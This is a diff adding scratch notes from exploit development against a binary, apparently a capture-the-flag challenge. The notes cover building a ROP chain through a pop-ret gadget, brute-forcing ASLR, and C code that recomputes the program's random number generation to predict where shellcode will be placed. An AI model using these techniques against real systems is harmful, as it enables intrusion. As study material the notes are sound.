@@ -1,0 +1,137 @@
+thinking.txt
+
+I'm thinking that I can build a rop chain in my buf
+and then jump to somewhere that rets into the chain
+
+but I can't do that becasue it doesn't jmp to rax, it calls it
+this means that as soon as I ret I'll pop back to where I am
+haha unless I call a pop ret 
+then the pop will get rid of my return address
+and then I can ret to whereevs
+
+
+
+
+0x555555555a9e p64(rop)
+
+
+k so that works, I just need to leak litterally ANYTHING and I should be right, so long as I have somewere to get a poping gadget I can then start a rop chain
+
+not sure what I'll do with my rop chain but we'll see what we get X)
+
+
+
+
+so going back to the weird rand stuff
+
+
+the rand64 is a bit more weird than I thought
+
+int rand64() {
+    var_18 = 0x0;
+    for (var_1C = 0x0; var_1C <= 0x3f; var_1C = var_1C + 0x1) {
+            rax = rand();
+            var_18 = sign_extend_32((rax + (SAR(rax, 0x1f) >> 0x1f) & 0x1) - (SAR(rax, 0x1f) >> 0x1f)) + var_18 + var_18;
+    }
+    rax = var_18;
+    return rax;
+}
+
+
+
+
+hmmm
+doesn't seem too interesting after all
+
+funfact
+the random address is on the stack
+
+0224| 0x7fffffffd958 --> 0x2c41b56e2000 (nop)
+0232| 0x7fffffffd960 --> 0x2c41b56e2000 (nop)
+
+
+
+I think I can best force aslr so that I can find the code section
+
+
+handle:
+0x00005651bb4a3838
+0x0000556283c7f838
+0x000055f4acfcc838
+
+distance 0x922934d000
+
+28 bits of random
+
+grrr
+
+
+when it accepts the connection, it dups all the things
+so what if it runs out of memory?
+maybe it'll dump some infozz hmmm ;)
+
+
+
+
+
+	// rand64 gives 
+	// 0x159ea7ba623eb94d
+	//for testing
+	// a = 0x159ea7ba623eb94d;
+	// randomNum = 0x47003e2b60022de2;
+	a = randomNum;
+	// a = c = 0x159ea7ba623eb94d
+	c = randomNum;
+	d = 0x8000000000018001;
+	c = a;
+	// d:a = d * a
+	// 0xacf53dd311f7d1491363b187832394d
+	// d = 0xacf53dd311f7d14
+
+	// lots of magic later...
+	d = ( a + (((((a>>10)*0x18001))>>(15*4 - 10))>>3))>>1 ; //((a*8) + ((((a>>10)*0x18001))>>(15*4 - 10)))>>4;
+
+
+	// printf("hig mul == %lx\n", d);
+
+	// so we've saved the overflow (which is small(ish(er))) into rdx at this point
+
+	a = a - d;
+	// a = 0xacf53dd311f3c39
+
+	// right shift a right 1 
+	// i.e lop off the last bit
+	// a = 0x567a9ee988f9e1c
+	a >>=1;
+
+	a += d;
+	// a = 0x1036fdcbc9af1b30
+	// printf("after add %lx\n", a);
+	// right shift a 46 to the right
+
+	a >>=46;
+	// printf("after shift 46 == %lx\n", a);
+	// a = 0x40db
+	// lolz, leaves us with like 15 bits
+
+	d = 0x555555555555;
+
+
+	a = a * d; //(imul)
+	// a = 0x159e555555553fb7
+	// printf("imul == %lx\n", a);
+
+	c = c - a ;
+	// c = 0x52650ce97996
+	a = c;
+	// a = 0x52650ce97996
+	// d = 0x1000 // page size 
+	// neg d 
+
+	// d = 0xfffff000
+	// signed extend mov d -> d
+	d = 0xfffffffffffff000;
+
+	a = a & d;
+	// a = 0x52650ce97000
+	printf("[!] shellcode is at 0x%lx\n", a);
